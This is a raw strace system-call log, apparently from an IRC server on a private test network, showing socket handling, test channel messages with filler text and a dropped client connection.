4519  07:15:03.650274 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650288 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650302 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650315 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650329 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650343 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650357 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650370 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650384 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650397 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650411 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650424 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650438 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650452 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650466 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650479 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650493 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650509 gettimeofday({1495624503, 650513}, NULL) = 0
4519  07:15:03.650521 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
6688  07:15:03.802780 <... accept resumed> {sa_family=AF_INET, sin_port=htons(39787), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
6688  07:15:03.802822 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdacf38) = -1 EINVAL (Invalid argument)
6688  07:15:03.802837 _llseek(8, 0, 0xbfdacf80, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6688  07:15:03.802850 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdacf38) = -1 EINVAL (Invalid argument)
6688  07:15:03.802860 _llseek(8, 0, 0xbfdacf80, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6688  07:15:03.802870 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
6688  07:15:03.802913 close(6)          = 0
6688  07:15:03.802985 dup(8)            = 6
6688  07:15:03.802999 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdaddd8) = -1 EINVAL (Invalid argument)
6688  07:15:03.803010 _llseek(6, 0, 0xbfdade20, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6688  07:15:03.803020 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
6688  07:15:03.803040 dup2(6, 1)        = 1
6688  07:15:03.803052 close(6)          = 0
6688  07:15:03.803063 fcntl64(1, F_SETFD, 0) = 0
6688  07:15:03.803073 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdadda8) = -1 EINVAL (Invalid argument)
6688  07:15:03.803083 _llseek(1, 0, 0xbfdaddf0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6688  07:15:03.803113 dup(8)            = 6
6688  07:15:03.803125 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdaddd8) = -1 EINVAL (Invalid argument)
6688  07:15:03.803136 _llseek(6, 0, 0xbfdade20, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6688  07:15:03.803146 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
6688  07:15:03.803163 dup2(6, 0)        = 0
6688  07:15:03.803172 close(6)          = 0
6688  07:15:03.803188 fcntl64(0, F_SETFD, 0) = 0
6688  07:15:03.803202 fcntl64(0, F_SETFD, 0) = 0
6688  07:15:03.803218 read(0,  <unfinished ...>
4519  07:15:03.803698 <... select resumed> ) = 1 (in [5], left {0, 850000})
4519  07:15:03.803724 clock_gettime(CLOCK_MONOTONIC, {1313, 620737830}) = 0
4519  07:15:03.803739 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:15:03.803753 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:15:03.803789 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:15:03.803805 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:15:03.803914 close(5)          = 0
4519  07:15:03.803930 time(NULL)        = 1495624503
4519  07:15:03.803940 time(NULL)        = 1495624503
4519  07:15:03.803951 gettimeofday({1495624503, 803955}, NULL) = 0
4519  07:15:03.803964 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:03.803993 clock_gettime(CLOCK_MONOTONIC, {1313, 621006531}) = 0
4519  07:15:03.804004 gettimeofday({1495624503, 804008}, NULL) = 0
4519  07:15:03.804015 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 940000})
4519  07:15:03.859448 clock_gettime(CLOCK_MONOTONIC, {1313, 676483671}) = 0
4519  07:15:03.859488 recv(4, "PRIVMSG  #testit BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 58
4519  07:15:03.859528 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859546 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859561 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859574 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859588 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859601 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859615 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859628 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859641 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859655 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859668 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859681 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859694 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859707 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859720 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859734 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859747 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859760 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859773 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859849 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859881 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859894 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.859911 gettimeofday({1495624503, 859915}, NULL) = 0
4519  07:15:03.859923 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 800000})
4519  07:15:04.059634 clock_gettime(CLOCK_MONOTONIC, {1313, 876643206}) = 0
4519  07:15:04.059634 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:15:04.059635 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059635 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059635 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059635 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059647 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059661 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059675 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059689 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059702 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059716 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059730 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059743 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059757 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059771 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059784 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059798 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059811 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059825 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059853 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059890 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059904 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059932 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:04.059947 time(NULL)        = 1495624504
4519  07:15:04.059957 time(NULL)        = 1495624504
4519  07:15:04.059973 gettimeofday({1495624504, 59977}, NULL) = 0
4519  07:15:04.059985 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:04.060014 clock_gettime(CLOCK_MONOTONIC, {1313, 877027519}) = 0
4519  07:15:04.060025 gettimeofday({1495624504, 60029}, NULL) = 0
4519  07:15:04.060036 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
